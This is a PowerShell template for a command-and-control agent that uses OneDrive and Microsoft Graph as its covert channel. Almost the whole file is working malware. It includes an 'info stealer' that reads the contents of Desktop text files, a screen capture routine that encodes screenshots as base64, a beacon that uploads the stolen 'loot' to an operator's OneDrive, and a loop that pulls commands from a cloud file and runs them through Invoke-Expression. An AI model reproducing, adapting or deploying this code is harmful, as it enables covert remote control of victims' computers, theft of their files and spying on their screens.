# ====================================================================
# template_onedrive.ps1 - OneDrive HTTPS C2 Agent
# ====================================================================

# Dynamic infrastructure placeholders injected during server generation
$ClientID     = "_ONEDRIVE_CLIENT_ID_PLACEHOLDER_"
$ClientSecret = "_ONEDRIVE_CLIENT_SECRET_PLACEHOLDER_"
$RefreshToken = "_ONEDRIVE_REFRESH_TOKEN_PLACEHOLDER_"

$AgentName = "OneDrive_Agent_" + (Get-Random -Minimum 1000 -Maximum 9999)

# Fetch temporary OAuth2 Access Token using the permanent Refresh Token
function Get-AccessToken {
    $Body = @{
        client_id     = $ClientID
        client_secret = $ClientSecret
        refresh_token = $RefreshToken
        grant_type    = "refresh_token"
        redirect_uri  = "http://localhost"
    }
    try {
        $Response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Method Post -Body $Body -ContentType "application/x-www-form-urlencoded"
        return $Response.access_token
    } catch {
        return $null
    }
}

# Upload operational transaction data (Loot) back to Microsoft Cloud
function Send-OneDriveLoot ([string]$Payload) {
    $Token = Get-AccessToken
    if (!$Token) { return }

    # Wrap payload output structure inside standard target boundary identity tags
    $FullPayload = "[$AgentName] $Payload"
    
    # PUT transaction streaming directly via explicit item path resolution
    $URL = "https://graph.microsoft.com/v1.0/me/drive/root:/C2/res.txt:/content"
    $Headers = @{ Authorization = "Bearer $Token" }
    
    try {
        $Discard = Invoke-RestMethod -Uri $URL -Headers $Headers -Method Put -Body $FullPayload -ContentType "text/plain"
    } catch {}
}

# INFO STEALER: Full Desktop File Enumeration & Content Extraction
function Invoke-DesktopFileStealer {
    $DesktopPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")
    
    $AllFiles = Get-ChildItem -Path $DesktopPath -File -ErrorAction SilentlyContinue
    
    if ($AllFiles) {
        $Report = "[⚡] INFO STEALER - DESKTOP MAP & SYSTEM EVIDENCE:`n"
        $Report += "==================================================`n"
        $Report += "Total Files Found: $($AllFiles.Count)`n`n"
        
        foreach ($File in $AllFiles) {
            $Report += "[+] FILE NAME: $($File.Name)`n"
            $Report += "[+] SIZE     : $($File.Length) Bytes`n"
            $Report += "[+] EXTENSION: $($File.Extension)`n"
            
            if ($File.Extension -eq ".txt") {
                $Content = Get-Content -Path $File.FullName -Raw -ErrorAction SilentlyContinue
                if (-not [string]::IsNullOrWhiteSpace($Content)) {
                    $Report += "[+] CONTENT  :`n$Content`n"
                } else {
                    $Report += "[+] CONTENT  : (Empty File)`n"
                }
            }
            $Report += "--------------------------------------------------`n"
        }
        return $Report
    } else {
        return "[-] Info Stealer: Desktop is completely empty."
    }
}

# INFO STEALER: Live Desktop Screenshot Capture (Base64 Streamer)
function Invoke-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        
        $Graphics.CopyFromScreen($Screen.X, $Screen.Y, 0, 0, $Screen.Size)
        
        $MemoryStream = New-Object System.IO.MemoryStream
        $Bitmap.Save($MemoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $Bytes = $MemoryStream.ToArray()
        $Base64String = [Convert]::ToBase64String($Bytes)
        
        $Graphics.Dispose()
        $Bitmap.Dispose()
        $MemoryStream.Dispose()
        
        return "[📊] SCREENSHOT_DATA:$Base64String"
    } catch {
        return "[-] Error capturing screenshot: $_"
    }
}

# Send initial telemetry synchronization beacon
Send-OneDriveLoot -Payload "[+] Hello Operator! New OneDrive Channel active."

# Main loop framework polling pipeline routine
while ($true) {
    try {
        $Token = Get-AccessToken
        if ($Token) {
            $Headers = @{ Authorization = "Bearer $Token" }
            $CmdURL = "https://graph.microsoft.com/v1.0/me/drive/root:/C2/cmd.txt:/content"
            
            # Request and ingest target transaction payload mapping from cmd.txt
            $RawCommand = Invoke-RestMethod -Uri $CmdURL -Headers $Headers -Method Get -ErrorAction SilentlyContinue
            
            # Validate matching targeted boundary constraint mapping sequence
            if ($RawCommand -match "^\[$AgentName\]\s(.*)") {
                $Command = $Matches[1]
                
                if (-not [string]::IsNullOrWhiteSpace($Command)) {
                    $Result = ""
                    try {
                        # Dynamic In-Memory compilation sequence execute mapping handlers
                        $RawResult = Invoke-Expression $Command | Out-String
                        $Result = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($RawResult))
                        if ([string]::IsNullOrWhiteSpace($Result)) {
                            $Result = "[+] Command executed successfully (No output)."
                        }
                    } catch {
                        $Result = "Error executing command over OneDrive: $_"
                    }
                    
                    # Flush structured data objects back up to res.txt endpoint
                    Send-OneDriveLoot -Payload $Result
                    
                    # Purge remote cloud asset buffer to prevent recurrent loops
                    $Discard = Invoke-RestMethod -Uri $CmdURL -Headers $Headers -Method Put -Body "" -ContentType "text/plain"
                }
            }
        }
    } catch {}
    
    Start-Sleep -Seconds 5
}
